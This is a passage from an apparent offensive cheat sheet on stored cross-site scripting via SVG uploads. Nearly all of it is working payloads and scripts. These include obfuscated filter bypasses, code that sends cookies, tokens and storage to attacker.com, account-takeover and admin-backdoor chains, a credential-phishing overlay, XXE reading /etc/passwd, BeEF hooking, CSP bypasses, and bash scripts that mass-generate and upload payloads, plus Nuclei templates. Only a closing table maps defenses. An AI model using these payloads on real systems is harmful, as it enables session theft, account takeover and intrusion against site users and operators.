  <svg xmlns="http://www.w3.org/2000/svg" ononloadload="alert(1)"></svg>

  <!-- Using confirm/prompt instead of alert -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="confirm(document.domain)"></svg>
  <svg xmlns="http://www.w3.org/2000/svg" onload="prompt(document.domain)"></svg>
  <svg xmlns="http://www.w3.org/2000/svg" onload="print()"></svg>
  ```
  :::

  :::card
  ---
  title: HTML Entity Encoding
  ---
  Encode the payload using XML/HTML entities:

  ```xml
  <!-- Decimal entities in attribute value -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
  </svg>

  <!-- Hex entities -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
  </svg>

  <!-- Mixed encoding -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="&#97;lert&#40;1)">
  </svg>

  <!-- Encode script tag content -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>&#97;&#108;&#101;&#114;&#116;(1)</script>
  </svg>
  ```

  ```bash
  # Generate decimal entity encoded payload
  echo -n "alert(document.cookie)" | od -A n -t d1 | tr ' ' '\n' | grep -v '^$' | awk '{printf "&#%d;", $1}'
  ```
  :::

  :::card
  ---
  title: JavaScript Obfuscation
  ---
  Obfuscate the JS payload to bypass pattern matching:

  ```xml
  <!-- eval + atob (base64) -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">
  </svg>

  <!-- String.fromCharCode -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
  </svg>

  <!-- setTimeout -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="setTimeout('ale'+'rt(1)',0)">
  </svg>

  <!-- Function constructor -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="Function('ale'+'rt(1)')()">
  </svg>

  <!-- Constructor via array -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="[].constructor.constructor('alert(1)')()">
  </svg>

  <!-- top reference -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="top['al'+'ert'](1)">
  </svg>

  <!-- window reference -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="window['al\x65rt'](document.domain)">
  </svg>

  <!-- Backtick template literal -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert`1`">
  </svg>
  ```

  ```bash
  # Generate String.fromCharCode payload
  echo -n "alert(document.cookie)" | od -A n -t d1 | tr -s ' ' | sed 's/^ //' | tr ' ' ','
  # Result: 97,108,101,114,116,40,100,111,99,...
  ```

  ```bash
  # Generate base64 payload
  echo -n "fetch('https://attacker.com/c?c='+document.cookie)" | base64
  ```
  :::

  :::card
  ---
  title: Alternative Event Handlers
  ---
  When `onload` is filtered, use other SVG-specific events:

  ```xml
  <!-- onbegin (animate/set) -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
  </svg>

  <!-- onend -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onend="alert(1)" attributeName="x" dur="0.001s"/>
  </svg>

  <!-- onrepeat -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onrepeat="alert(1)" attributeName="x" dur="0.001s" repeatCount="2"/>
  </svg>

  <!-- onfocus + autofocus trick -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" tabindex="0" onfocus="alert(1)"/>
    <animate attributeName="x" dur="0.001s" onend="document.querySelector('rect').focus()"/>
  </svg>

  <!-- onactivate -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" onactivate="alert(1)"/>
  </svg>

  <!-- onmouseover (user interaction required) -->
  <svg xmlns="http://www.w3.org/2000/svg" width="800" height="800">
    <rect width="800" height="800" fill="transparent" onmouseover="alert(1)"/>
  </svg>
  ```
  :::

  :::card
  ---
  title: Namespace Tricks
  ---
  Abuse XML namespace declarations to bypass filters:

  ```xml
  <!-- Custom namespace prefix for SVG -->
  <root xmlns:svg="http://www.w3.org/2000/svg">
    <svg:svg>
      <svg:script>alert(1)</svg:script>
    </svg:svg>
  </root>

  <!-- Omit xml declaration -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

  <!-- Extra namespace declarations -->
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink"
       xmlns:html="http://www.w3.org/1999/xhtml"
       xmlns:ev="http://www.w3.org/2001/xml-events"
       onload="alert(1)">
  </svg>

  <!-- xml-events namespace -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:ev="http://www.w3.org/2001/xml-events">
    <handler ev:event="load" type="application/ecmascript">alert(1)</handler>
  </svg>
  ```
  :::

  :::card
  ---
  title: Content-Type Confusion
  ---
  Upload SVG content but manipulate Content-Type to bypass filters:

  ```bash
  # Upload as image/jpeg but with SVG content
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=image/jpeg;filename=avatar.jpg"

  # Upload as image/png
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=image/png;filename=photo.png"

  # Upload as application/xml
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=application/xml;filename=data.xml"

  # Upload as text/xml
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=text/xml;filename=doc.xml"

  # If server sniffs content and sets correct type
  # the SVG will execute regardless of upload type
  ```
  :::
::

---

## Chaining SVG XSS with Other Attacks

::accordion
  :::accordion-item{label="SVG XSS → Account Takeover"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      <![CDATA[
        // Steal session and change email/password
        var cookies = document.cookie;
        
        // Exfiltrate cookies
        fetch('https://attacker.com/steal?c=' + encodeURIComponent(cookies));
        
        // Change email via API
        fetch('/api/account/email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': document.querySelector('meta[name=csrf-token]')?.content || ''
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
        });
        
        // Change password via API
        fetch('/api/account/password', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': document.querySelector('meta[name=csrf-token]')?.content || ''
          },
          body: JSON.stringify({password: 'hacked123', password_confirmation: 'hacked123'})
        });
      ]]>
    </script>
  </svg>
  ```
  :::

  :::accordion-item{label="SVG XSS → CSRF Chain"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      <![CDATA[
        // Create admin user via CSRF
        fetch('/admin/users/create', {
          method: 'POST',
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: 'username=backdoor&password=P@ss123&role=admin',
          credentials: 'include'
        });
        
        // Or add attacker as admin
        fetch('/admin/settings/admins', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({email: 'attacker@evil.com', role: 'superadmin'}),
          credentials: 'include'
        });
      ]]>
    </script>
  </svg>
  ```
  :::

  :::accordion-item{label="SVG XSS → Internal Network Scanning"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      <![CDATA[
        var results = [];
        var targets = [];
        
        // Generate internal IP range
        for (var i = 1; i <= 254; i++) {
          targets.push('192.168.1.' + i);
          targets.push('10.0.0.' + i);
          targets.push('172.16.0.' + i);
        }
        
        // Common internal ports
        var ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 9090, 9200, 27017];
        
        function scan(host, port) {
          return new Promise(function(resolve) {
            var img = new Image();
            var start = Date.now();
            img.onload = function() { resolve({host: host, port: port, status: 'open', time: Date.now()-start}); };
            img.onerror = function() {
              var elapsed = Date.now() - start;
              if (elapsed < 1000) resolve({host: host, port: port, status: 'open', time: elapsed});
              else resolve({host: host, port: port, status: 'closed', time: elapsed});
            };
            setTimeout(function() { resolve({host: host, port: port, status: 'timeout'}); }, 3000);
            img.src = 'http://' + host + ':' + port + '/favicon.ico?' + Math.random();
          });
        }
        
        async function run() {
          for (var t = 0; t < targets.length; t++) {
            for (var p = 0; p < ports.length; p++) {
              var result = await scan(targets[t], ports[p]);
              if (result.status === 'open') {
                results.push(result);
                fetch('https://attacker.com/scan', {
                  method: 'POST',
                  body: JSON.stringify(result)
                });
              }
            }
          }
        }
        run();
      ]]>
    </script>
  </svg>
  ```
  :::

  :::accordion-item{label="SVG XSS → API Key/Token Extraction"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      <![CDATA[
        var stolen = {
          cookies: document.cookie,
          localStorage: {},
          sessionStorage: {},
          meta: {},
          scripts: []
        };
        
        // Dump localStorage
        for (var i = 0; i < localStorage.length; i++) {
          var key = localStorage.key(i);
          stolen.localStorage[key] = localStorage.getItem(key);
        }
        
        // Dump sessionStorage
        for (var i = 0; i < sessionStorage.length; i++) {
          var key = sessionStorage.key(i);
          stolen.sessionStorage[key] = sessionStorage.getItem(key);
        }
        
        // Extract meta tags (CSRF tokens, API keys)
        document.querySelectorAll('meta').forEach(function(m) {
          stolen.meta[m.name || m.httpEquiv || m.getAttribute('property') || 'unknown'] = m.content;
        });
        
        // Extract inline script content for hardcoded tokens
        document.querySelectorAll('script').forEach(function(s) {
          if (s.textContent.length < 5000) {
            stolen.scripts.push(s.textContent);
          }
        });
        
        // Fetch user profile for API tokens
        fetch('/api/user/profile', {credentials: 'include'})
          .then(function(r) { return r.text(); })
          .then(function(body) {
            stolen.profile = body;
            fetch('https://attacker.com/exfil', {
              method: 'POST',
              body: JSON.stringify(stolen)
            });
          });
      ]]>
    </script>
  </svg>
  ```
  :::

  :::accordion-item{label="SVG XSS → Phishing Overlay"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
    <foreignObject width="800" height="600">
      <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0;padding:0;">
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center;">
          <div style="width:400px;padding:40px;border:1px solid #ddd;border-radius:8px;font-family:Arial,sans-serif;">
            <h2 style="text-align:center;color:#333;">Session Expired</h2>
            <p style="color:#666;text-align:center;">Please re-enter your credentials</p>
            <form id="phish">
              <input type="text" name="username" placeholder="Username" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"/>
              <input type="password" name="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"/>
              <button type="submit" style="width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;">Login</button>
            </form>
            <script>
              document.getElementById('phish').addEventListener('submit', function(e) {
                e.preventDefault();
                var fd = new FormData(this);
                fetch('https://attacker.com/phish', {method:'POST', body:fd});
                window.location.href = '/dashboard';
              });
            </script>
          </div>
        </div>
      </body>
    </foreignObject>
  </svg>
  ```
  :::

  :::accordion-item{label="SVG + XXE Combination"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <text x="10" y="20" font-size="12">&xxe;</text>
  </svg>
  ```

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
    %remote;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
    <text x="10" y="20">&exfil;</text>
  </svg>
  ```

  ```bash
  # evil.dtd hosted on attacker server
  cat > evil.dtd << 'EOF'
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % wrapper "<!ENTITY exfil SYSTEM 'http://attacker.com/xxe?data=%file;'>">
  %wrapper;
  EOF

  python3 -m http.server 80
  ```
  :::

  :::accordion-item{label="SVG XSS → BeEF Hooking"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      <![CDATA[
        var s = document.createElementNS('http://www.w3.org/1999/xhtml','script');
        s.src = 'http://ATTACKER_IP:3000/hook.js';
        document.documentElement.appendChild(s);
      ]]>
    </script>
  </svg>
  ```

  ```bash
  # Start BeEF
  cd /usr/share/beef-xss
  ./beef

  # Hook URL will be: http://ATTACKER_IP:3000/hook.js
  # Dashboard: http://ATTACKER_IP:3000/ui/panel
  ```
  :::
::

---

## CSP Bypass for SVG Context

::warning
When Content-Security-Policy headers restrict script execution, use these techniques to bypass within the SVG context.
::

::tabs
  :::tabs-item{label="CSP Analysis"}
  ```bash
  # Fetch CSP header
  curl -sI https://target.com/uploads/test.svg | grep -i "content-security-policy"
  ```

  ```bash
  # Parse CSP with online tools
  # https://csp-evaluator.withgoogle.com/
  # Paste the CSP value
  ```

  ```bash
  # Check for unsafe-inline
  curl -sI https://target.com/uploads/test.svg | grep -i "content-security-policy" | grep -i "unsafe-inline"
  # If present -> inline scripts allowed, SVG XSS works directly
  ```

  ```bash
  # Check for unsafe-eval
  curl -sI https://target.com/uploads/test.svg | grep -i "content-security-policy" | grep -i "unsafe-eval"
  # If present -> eval(), setTimeout('string'), Function() work
  ```

  ```bash
  # Check for whitelisted domains
  curl -sI https://target.com | grep -i "content-security-policy" | tr ';' '\n' | grep "script-src"
  ```
  :::

  :::tabs-item{label="JSONP Endpoint Abuse"}
  ```xml
  <!-- If CSP allows *.google.com or specific CDN -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript" href="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>
  </svg>
  ```

  ```xml
  <!-- If CSP allows cdnjs.cloudflare.com -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript" href="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <div ng-app ng-csp>
          {{$eval.constructor('alert(1)')()}}
        </div>
      </body>
    </foreignObject>
  </svg>
  ```
  :::

  :::tabs-item{label="Data URI and Blob"}
  ```xml
  <!-- data: URI if allowed in CSP -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <a href="data:text/html,<script>alert(document.domain)</script>">
      <rect width="200" height="100" fill="blue"/>
    </a>
  </svg>
  ```

  ```xml
  <!-- Blob URL creation -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="var b=new Blob(['&lt;script&gt;alert(1)&lt;/script&gt;'],{type:'text/html'});window.open(URL.createObjectURL(b))">
  </svg>
  ```
  :::

  :::tabs-item{label="CSS-Based Exfiltration (No JS)"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <style>
      @import url('https://attacker.com/css-exfil?origin=svg-upload');
      
      /* Exfiltrate via CSS attribute selectors */
      /* This works when SVG is embedded inline */
      input[name="csrf"][value^="a"] { background: url('https://attacker.com/css?csrf=a'); }
      input[name="csrf"][value^="b"] { background: url('https://attacker.com/css?csrf=b'); }
      input[name="csrf"][value^="c"] { background: url('https://attacker.com/css?csrf=c'); }
    </style>
    <rect width="1" height="1"/>
  </svg>
  ```
  :::

  :::tabs-item{label="Meta Redirect (No JS)"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="1" height="1">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <meta http-equiv="refresh" content="0;url=https://attacker.com/phishing"/>
      </body>
    </foreignObject>
  </svg>
  ```
  :::
::

---

## SVG XSS Through Rendering Contexts

::tabs
  :::tabs-item{label="Direct URL Access"}
  ```bash
  # Most reliable execution context
  # Navigate browser directly to the uploaded SVG
  curl -s "https://target.com/uploads/xss.svg" | head -20

  # Check Content-Type served
  curl -sI "https://target.com/uploads/xss.svg" | grep -i content-type
  # Must be: image/svg+xml or application/xml or text/xml
  # If text/plain or application/octet-stream -> no execution
  ```
  :::

  :::tabs-item{label="Iframe Embedding"}
  ```bash
  # If the application embeds uploaded images in iframes
  # Check page source for iframe references
  curl -s https://target.com/profile | grep -oP '<iframe[^>]*src="[^"]*"'
  ```

  ```xml
  <!-- If you can control where the SVG is referenced -->
  <!-- Inject iframe pointing to uploaded SVG -->
  <iframe src="/uploads/xss.svg" width="0" height="0"></iframe>
  ```
  :::

  :::tabs-item{label="Object/Embed Tags"}
  ```bash
  # Check if application uses object or embed to display images
  curl -s https://target.com/profile | grep -oP '<(object|embed)[^>]*>'
  ```

  ```html
  <!-- If you find these rendering contexts, SVG XSS executes -->
  <object data="/uploads/xss.svg" type="image/svg+xml"></object>
  <embed src="/uploads/xss.svg" type="image/svg+xml"/>
  ```
  :::

  :::tabs-item{label="Markdown/Rich Text Injection"}
  ```markdown
  <!-- In markdown contexts that allow HTML -->
  ![image](/uploads/xss.svg)

  <!-- Some markdown renderers may use embed/object -->
  <object data="/uploads/xss.svg" type="image/svg+xml"></object>
  ```

  ```bash
  # Test if markdown renderer uses <img> (safe) or <embed>/<object> (vulnerable)
  # Upload SVG, embed in markdown comment/post, check rendered HTML source
  curl -s "https://target.com/posts/1" | grep -oP '<[^>]*xss\.svg[^>]*>'
  ```
  :::

  :::tabs-item{label="File Preview Feature"}
  ```bash
  # Many apps have file preview that renders SVG
  # Common preview URL patterns
  curl -s "https://target.com/preview?file=uploads/xss.svg"
  curl -s "https://target.com/api/files/preview/FILE_ID"
  curl -s "https://target.com/view/xss.svg"
  curl -s "https://target.com/render?path=/uploads/xss.svg"
  ```
  :::
::

---

## Mass Payload Generation

::code-group
```bash [generate_all_payloads.sh]
#!/bin/bash
# Generate comprehensive SVG XSS payload set

OUTDIR="svg_payloads"
mkdir -p "$OUTDIR"

CALLBACK="${1:-https://attacker.com/callback}"

# 1. onload
cat > "$OUTDIR/01_onload.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('${CALLBACK}?t=onload&c='+document.cookie)"><rect width="1" height="1"/></svg>
EOF

# 2. script tag
cat > "$OUTDIR/02_script.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('${CALLBACK}?t=script&c='+document.cookie)</script></svg>
EOF

# 3. script CDATA
cat > "$OUTDIR/03_script_cdata.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[fetch('${CALLBACK}?t=cdata&c='+document.cookie)]]></script></svg>
EOF

# 4. foreignObject
cat > "$OUTDIR/04_foreignobject.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="1" height="1"><body xmlns="http://www.w3.org/1999/xhtml"><script>fetch('${CALLBACK}?t=foreign&c='+document.cookie)</script></body></foreignObject></svg>
EOF

# 5. animate onbegin
cat > "$OUTDIR/05_animate.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="fetch('${CALLBACK}?t=animate&c='+document.cookie)" attributeName="x" dur="1s"/></svg>
EOF

# 6. set onbegin
cat > "$OUTDIR/06_set.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="fetch('${CALLBACK}?t=set&c='+document.cookie)" attributeName="x" to="1" dur="1s"/></svg>
EOF

# 7. a href javascript
cat > "$OUTDIR/07_a_href.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:fetch('${CALLBACK}?t=ahref&c='+document.cookie)"><rect width="500" height="500" fill="transparent"/></a></svg>
EOF

# 8. image onerror
cat > "$OUTDIR/08_img_onerror.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="x" onerror="fetch('${CALLBACK}?t=onerror&c='+document.cookie)"/></svg>
EOF

# 9. foreignObject img onerror
cat > "$OUTDIR/09_foreign_img.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="1" height="1"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="fetch('${CALLBACK}?t=foreignimg&c='+document.cookie)"/></body></foreignObject></svg>
EOF

# 10. base64 eval
B64=$(echo -n "fetch('${CALLBACK}?t=b64&c='+document.cookie)" | base64 -w0)
cat > "$OUTDIR/10_base64_eval.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('${B64}'))"><rect width="1" height="1"/></svg>
EOF

# 11. mouseover (interaction required)
cat > "$OUTDIR/11_mouseover.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="800"><rect width="800" height="800" fill="transparent" onmouseover="fetch('${CALLBACK}?t=mouseover&c='+document.cookie)"/></svg>
EOF

# 12. onfocus via animate
cat > "$OUTDIR/12_onfocus.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg"><rect tabindex="0" onfocus="fetch('${CALLBACK}?t=focus&c='+document.cookie)" width="100" height="100"/><animate attributeName="x" dur="0.001s" onend="document.querySelector('rect').focus()"/></svg>
EOF

# 13. handler element
cat > "$OUTDIR/13_handler.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg" xmlns:ev="http://www.w3.org/2001/xml-events"><handler ev:event="load" type="application/ecmascript">fetch('${CALLBACK}?t=handler&c='+document.cookie)</handler></svg>
EOF

# 14. foreignObject iframe
cat > "$OUTDIR/14_foreign_iframe.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="1" height="1"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:fetch('${CALLBACK}?t=iframe&c='+parent.document.cookie)" width="0" height="0"/></body></foreignObject></svg>
EOF

# 15. entity encoded onload
cat > "$OUTDIR/15_entity_encoded.svg" << EOF
<svg xmlns="http://www.w3.org/2000/svg" onload="&#102;&#101;&#116;&#99;&#104;('${CALLBACK}?t=entity')"><rect width="1" height="1"/></svg>
EOF

echo "[*] Generated $(ls -1 $OUTDIR/*.svg | wc -l) payloads in $OUTDIR/"
ls -la "$OUTDIR/"
```

```bash [upload_all_payloads.sh]
#!/bin/bash
# Upload all generated SVG payloads to target

TARGET="${1:?Usage: $0 <target_url> [upload_path] [cookie]}"
UPLOAD_PATH="${2:-/upload}"
COOKIE="${3:-session=YOUR_SESSION}"
PAYLOAD_DIR="svg_payloads"

echo "[*] Target: ${TARGET}${UPLOAD_PATH}"
echo "[*] Payloads: $(ls -1 $PAYLOAD_DIR/*.svg 2>/dev/null | wc -l)"
echo ""

for svg in "$PAYLOAD_DIR"/*.svg; do
    fname=$(basename "$svg")
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "${TARGET}${UPLOAD_PATH}" \
      -F "file=@${svg}" \
      -H "Cookie: ${COOKIE}" \
      --max-time 10)
    
    if [ "$response" = "200" ] || [ "$response" = "201" ]; then
        echo "[UPLOADED] ${fname} -> HTTP ${response}"
    else
        echo "[FAILED]   ${fname} -> HTTP ${response}"
    fi
done

echo ""
echo "[*] Upload phase complete. Check attacker server for callbacks."
echo "[*] Try accessing uploaded files directly:"
echo ""

for svg in "$PAYLOAD_DIR"/*.svg; do
    fname=$(basename "$svg")
    for dir in uploads upload files images media assets avatars content static data; do
        echo "    ${TARGET}/${dir}/${fname}"
    done
done
```

```bash [find_uploaded_svg.sh]
#!/bin/bash
# Find and verify uploaded SVG files

TARGET="${1:?Usage: $0 <target_url>}"
DIRS="uploads upload files images media assets avatars content static data documents profile pictures photos gallery"

echo "[*] Scanning for SVG files on ${TARGET}"
echo ""

for dir in $DIRS; do
    for i in $(seq -w 1 15); do
        fname="${i}_*.svg"
        # Try numbered payloads
        for svg_file in svg_payloads/*.svg; do
            fname=$(basename "$svg_file")
            url="${TARGET}/${dir}/${fname}"
            status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url")
            if [ "$status" = "200" ]; then
                ct=$(curl -sI --max-time 3 "$url" | grep -i "content-type" | head -1)
                echo "[FOUND] ${url}"
                echo "        ${ct}"
            fi
        done
    done
done
```
::

---

## SVGZ (Compressed SVG) Payloads

::note
SVGZ files are gzip-compressed SVG files. Some applications accept `.svgz` when they block `.svg`, or vice versa.
::

```bash
# Create SVGZ payload (gzip compressed SVG)
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><rect width="1" height="1"/></svg>' | gzip > xss.svgz

# Upload as SVGZ
curl -X POST https://target.com/upload \
  -F "file=@xss.svgz;type=image/svg+xml" \
  -H "Cookie: session=YOUR_SESSION" \
  -v

# Upload with explicit SVGZ type
curl -X POST https://target.com/upload \
  -F "file=@xss.svgz;type=image/svg+xml-compressed" \
  -v
```

```bash
# Generate all payloads as SVGZ
for svg in svg_payloads/*.svg; do
  gzip -c "$svg" > "${svg}z"
done

# Upload all SVGZ
for svgz in svg_payloads/*.svgz; do
  fname=$(basename "$svgz")
  curl -X POST https://target.com/upload \
    -F "file=@${svgz};filename=${fname}" \
    -s -o /dev/null -w "%{http_code} ${fname}\n"
done
```

---

## Nuclei Templates for SVG XSS

::code-collapse
```yaml [svg-xss-upload.yaml]
id: svg-xss-upload

info:
  name: SVG XSS File Upload
  author: pentester
  severity: high
  description: Tests for stored XSS via SVG file upload
  tags: xss,upload,svg,fileupload

variables:
  marker: "{{rand_base(6)}}"

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----FormBoundary{{marker}}
        
        ------FormBoundary{{marker}}
        Content-Disposition: form-data; name="file"; filename="test_{{marker}}.svg"
        Content-Type: image/svg+xml
        
        <?xml version="1.0" encoding="UTF-8"?>
        <svg xmlns="http://www.w3.org/2000/svg" onload="window.svgxss_{{marker}}=1">
        <rect width="100" height="100"/>
        </svg>
        ------FormBoundary{{marker}}--

      - |
        GET {{BaseURL}}/uploads/test_{{marker}}.svg HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "onload="
          - "svgxss_{{marker}}"
        condition: and

      - type: word
        part: header_2
        words:
          - "image/svg+xml"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: header_1
        regex:
          - "(?i)(location|path|url|file)[\"\\s:=]+([^\"'\\s>]+\\.svg)"
```

```yaml [svg-xss-multi-vector.yaml]
id: svg-xss-multi-vector

info:
  name: SVG XSS Multi-Vector Upload
  author: pentester
  severity: high
  description: Tests multiple SVG XSS vectors against upload endpoints
  tags: xss,upload,svg

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----Bound
        
        ------Bound
        Content-Disposition: form-data; name="file"; filename="test.svg"
        Content-Type: image/svg+xml
        
        §payload§
        ------Bound--

    attack: sniper
    payloads:
      payload:
        - '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>'
        - '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        - '<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[alert(1)]]></script></svg>'
        - '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>'
        - '<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="alert(1)" attributeName="x" to="1" dur="1s"/></svg>'
        - '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="1" height="1"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="alert(1)"/></body></foreignObject></svg>'
        - '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="x" onerror="alert(1)"/></svg>'

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "error"
          - "invalid"
          - "not allowed"
          - "rejected"
        negative: true
        condition: and
```
::

```bash
# Run single template
nuclei -t svg-xss-upload.yaml -u https://target.com -v

# Run multi-vector template
nuclei -t svg-xss-multi-vector.yaml -u https://target.com -v

# Run against multiple targets
nuclei -t svg-xss-upload.yaml -l targets.txt -c 50 -v -o svg-results.txt

# Run with custom header
nuclei -t svg-xss-upload.yaml -u https://target.com -H "Cookie: session=abc123" -v
```

---

## Validation & Defense Mapping

::collapsible

| Defense Mechanism | Description | SVG XSS Bypasses? | Technique |
| --- | --- | --- | --- |
| Extension whitelist (only jpg/png/gif) | Blocks `.svg` extension | Upload as `.svg.jpg`, change extension post-upload, or find MIME sniffing | Extension manipulation |
| Extension whitelist (includes svg) | Allows `.svg` | Yes, directly | Standard upload |
| Content-Type check (image only) | Checks `image/*` | Yes, `image/svg+xml` is a valid image type | Standard MIME |
| Magic bytes validation | Checks file header | Yes, `<?xml` or `<svg` passes XML magic | Standard SVG |
| File re-rendering (ImageMagick) | Converts SVG to raster | No, XSS stripped | Bypass ImageMagick if vulnerable |
| DOMPurify sanitization | Strips dangerous SVG elements | Partial, depends on version/config | Use bypass techniques for specific versions |
| Server-side SVG sanitization | Custom element/attribute stripping | Partial | Namespace tricks, encoding, alternative handlers |
| Content-Disposition: attachment | Forces download | No direct XSS | Need alternate rendering path |
| Content-Type: text/plain | Serves as plain text | No rendering | Need MIME sniffing or path confusion |
| CSP script-src 'none' | Blocks all scripts | No inline JS | CSS exfil, meta redirect, phishing overlay |
